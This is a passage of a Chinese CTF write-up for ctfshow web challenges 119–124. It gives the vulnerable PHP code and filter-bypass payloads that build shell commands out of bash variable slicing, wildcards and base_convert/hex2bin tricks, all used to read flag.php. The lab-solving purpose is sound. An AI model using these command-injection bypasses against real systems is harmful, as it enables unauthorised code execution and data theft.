<p>或者</p>
<pre class="language-none"><code class="language-none">$&#123;PATH:$&#123;#HOME&#125;:$&#123;#SHLVL&#125;&#125;$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125; ?$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125;??.???</code></pre>

<pre class="language-none"><code class="language-none">SHLVL&#96;是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时&#96;$&#123;SHLVL&#125;&#x3D;1&#96;，然后在此shell中再打开一个shell时&#96;$&#123;SHLVL&#125;&#x3D;2&#96;。
&#96;$&#123;PWD:$&#123;#&#125;:$&#123;SHLVL&#125;&#125;&#96;就输出&#96;&#x2F;</code></pre>

<pre class="language-none"><code class="language-none">$&#123;#&#125;是0，$&#123;SHLVL&#125;为1&#96;
&#96;$&#123;#PWD&#125;是回显字符数，$&#123;PWD&#125; 是&#x2F;root，$&#123;#PWD&#125;是5</code></pre>

<h1 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h1><p>禁用了<code>$&#123;PATH</code></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430232002769.png" alt="image-20220430232002769"></p>
<pre class="language-none"><code class="language-none">$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125;     &#x3D;&#x3D;&#x3D;&#x3D;&gt;   t

$&#123;PWD:$&#123;Z&#125;:$&#123;#SHLVL&#125;&#125;    &#x3D;&#x3D;&#x3D;&#x3D;&gt;   &#x2F;


$&#123;SHLVL&#125;       &#x2F;&#x2F;一般是一个个位数
$&#123;#SHLVL&#125;     &#x2F;&#x2F;1，表示结果的字符长度
$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;       &#x2F;&#x2F;表示&#x2F;
$&#123;USER&#125;        &#x2F;&#x2F;www-data
$&#123;PHP_VERSION:~A&#125;       &#x2F;&#x2F;2
$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125;         &#x2F;&#x2F;at


&#x2F;bin&#x2F;cat flag.php

$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???
$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;??$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ????.???</code></pre>

<h1 id="web120"><a href="#web120" class="headerlink" title="web120"></a>web120</h1><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST[&#39;code&#39;]))&#123;
    $code&#x3D;$_POST[&#39;code&#39;];
    if(!preg_match(&#39;&#x2F;\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\&#x2F;|\(|\)|\[|\]|\\\\|\+|\-|\!|\&#x3D;|\^|\*|\x26|\%|\&lt;|\&gt;|\&#39;|\&quot;|\&#96;|\||\,&#x2F;&#39;, $code))&#123;    
        if(strlen($code)&gt;65)&#123;
            echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.&#39;you are so long , I dont like &#39;.&#39;&lt;&#x2F;div&gt;&#39;;
        &#125;
        else&#123;
        echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.system($code).&#39;&lt;&#x2F;div&gt;&#39;;
        &#125;
    &#125;
    else&#123;
     echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;evil input&lt;&#x2F;div&gt;&#39;;
    &#125;
&#125;

?&gt;
</code></pre>

<p>payload</p>
<pre class="language-php" data-language="php"><code class="language-php">$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</code></pre>

<p>或者</p>
<pre class="language-none"><code class="language-none">$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</code></pre>

<h1 id="web121"><a href="#web121" class="headerlink" title="web121"></a>web121</h1><pre class="language-none"><code class="language-none">
&lt;?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST[&#39;code&#39;]))&#123;
    $code&#x3D;$_POST[&#39;code&#39;];
    if(!preg_match(&#39;&#x2F;\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\&#x2F;|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\&#x3D;|\^|\*|\x26|\%|\&lt;|\&gt;|\&#39;|\&quot;|\&#96;|\||\,&#x2F;&#39;, $code))&#123;    
        if(strlen($code)&gt;65)&#123;
            echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.&#39;you are so long , I dont like &#39;.&#39;&lt;&#x2F;div&gt;&#39;;
        &#125;
        else&#123;
        echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.system($code).&#39;&lt;&#x2F;div&gt;&#39;;
        &#125;
    &#125;
    else&#123;
     echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;evil input&lt;&#x2F;div&gt;&#39;;
    &#125;
&#125;

?&gt;</code></pre>

<p>相比上一题，多过滤了一个SHLVL，那就用#?代替</p>
<p>payload</p>
<pre class="language-php" data-language="php"><code class="language-php">$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</code></pre>

<p>相当于</p>
<p>/bin/bash64 flag.php</p>
<p>或者</p>
<pre class="language-php" data-language="php"><code class="language-php">$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;#?&#125;&#125;?? ????.???
&#x2F;bin&#x2F;rev</code></pre>

<h1 id="web122"><a href="#web122" class="headerlink" title="web122"></a>web122</h1><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST[&#39;code&#39;]))&#123;
    $code&#x3D;$_POST[&#39;code&#39;];
    if(!preg_match(&#39;&#x2F;\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\&#x2F;|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\&#x3D;|\^|\*|\x26|#|%|\&gt;|\&#39;|\&quot;|\&#96;|\||\,&#x2F;&#39;, $code))&#123;    
        if(strlen($code)&gt;65)&#123;
            echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.&#39;you are so long , I dont like &#39;.&#39;&lt;&#x2F;div&gt;&#39;;
        &#125;
        else&#123;
        echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.system($code).&#39;&lt;&#x2F;div&gt;&#39;;
        &#125;
    &#125;
    else&#123;
     echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;evil input&lt;&#x2F;div&gt;&#39;;
    &#125;
&#125;

?&gt;</code></pre>

<p>payload</p>
<blockquote>
<p>通过$?来实现的，$?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误</p>
</blockquote>
<pre class="language-none"><code class="language-none">code&#x3D;&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.??? *#可能存在成功的机会，不断刷新*</code></pre>

<h1 id="web124"><a href="#web124" class="headerlink" title="web124"></a>web124</h1><pre class="language-php" data-language="php"><code class="language-php">&lt;?php

&#x2F;*
# -*- coding: utf-8 -*-
# @Author: 收集自网络
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-06 14:04:45

*&#x2F;

error_reporting(0);
&#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET[&#39;c&#39;]))&#123;
    show_source(__FILE__);
&#125;else&#123;
    &#x2F;&#x2F;例子 c&#x3D;20-1
    $content &#x3D; $_GET[&#39;c&#39;];
    if (strlen($content) &gt;&#x3D; 80) &#123;
        die(&quot;太长了不会算&quot;);
    &#125;
    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];
    foreach ($blacklist as $blackitem) &#123;
        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;
            die(&quot;请不要输入奇奇怪怪的字符&quot;);
        &#125;
    &#125;
    &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp
    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];
    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) &#123;
        if (!in_array($func, $whitelist)) &#123;
            die(&quot;请不要输入奇奇怪怪的函数&quot;);
        &#125;
    &#125;
    &#x2F;&#x2F;帮你算出答案
    eval(&#39;echo &#39;.$content.&#39;;&#39;);
&#125;</code></pre>

<p>不能有特殊字符，不能有除whitelist里面的字母，大概思路就是利用进制转换以数字构造字母<br>题中可用的进制转换函数：<code>&#39;base_convert&#39;, &#39;bindec&#39;,&#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;</code></p>
<pre class="language-none"><code class="language-none">$_GET[abs]($_GET[acos])		&#x2F;&#x2F;strlen($content) &gt;&#x3D; 80，有长度限制，所以利用get命令执行
↓
$_GET&#123;abs&#125;($_GET&#123;acos&#125;)		&#x2F;&#x2F;[]在黑名单，用&#123;&#125;代替
↓
$pi&#x3D;_GET;$$pi&#123;abs&#125;($$pi&#123;acos&#125;)
↓
进制转换
base_convert(number,frombase,tobase)：在任意进制之间转换数字
dechex()：把十进制数转换为十六进制数
hex2bin()：把十六进制值的字符串转换为二进制，返回 ASCII 字符
最重要的是hex2bin函数，但是不在白名单里面

base_convert构造hex2bin（我想用base_convert直接转_GET，但是只能得到get）
base_convert(&#39;hex2bin&#39;,36,10)	→	37907361743
_GET	→  hex十六进制 5f474554 (不能有字母所以十六进制不行) →  dec十进制 1598506324	(在线转换)

所以_GET可以写为
hex2bin(dechex(1598506324))
↓
base_convert(&#39;37907361743&#39;,10,36)(dechex(1598506324))

最后的payload
?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;acos&#125;)&amp;abs&#x3D;system&amp;acos&#x3D;ls
?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;acos&#125;)&amp;abs&#x3D;system&amp;acos&#x3D;cat *
</code></pre>

<p>payload1：</p>
<pre class="language-none"><code class="language-none">?c&#x3D;$pi&#x3D;base_convert,$pi(1751504350,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;) 
添加头部信息：1&#x3D;tac flag.php</code></pre>

<p>payload2：</p>
<pre class="language-none"><code class="language-none">?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;acos&#125;);&amp;abs&#x3D;system&amp;acos&#x3D;tac flag.php</code></pre>

<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2>
                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">Ethe</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://Ethe448.github.io/2022/04/24/ctfshow-web/">https://Ethe448.github.io/2022/04/24/ctfshow-web/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">Ethe</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/ctf/">
                                    <span class="chip bg-color">ctf</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    
        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="/libs/valine/Valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        appId: '9uxoX9BlIsmwlt8gNkGLF9Ow-gzGzoHsz',
        appKey: 'rrsgRW80sgJP9PdFwFycskT9',
        notify: 'false' === 'true',
        verify: 'false' === 'true',
        visitor: 'true' === 'true',
        avatar: 'mm',
        pageSize: '8',
        lang: 'zh-cn',
        placeholder: 'just go go'
    });
</script>

<!--酷Q推送-->


    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2022/04/24/2022DASCTF-Apr%E5%A4%8D%E7%8E%B0/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="2022DASCTF Apr复现">
                        
                        <span class="card-title">2022DASCTF Apr复现</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2022-04-24
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            Ethe
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/ctf/">
                        <span class="chip bg-color">ctf</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2022/03/30/dasctf%E4%B8%89%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="dasctf三月赛复现">
                        
                        <span class="card-title">dasctf三月赛复现</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-30
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            Ethe
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/ctf/">
                        <span class="chip bg-color">ctf</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
$(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h1, h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h1, h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="/libs/aplayer/Meting.min.js"></script>

    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2022</span>
            
            <a href="/about" target="_blank">Ethe</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                        class="white-color">111.5k</span>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/Ethe448" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:1078240421@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







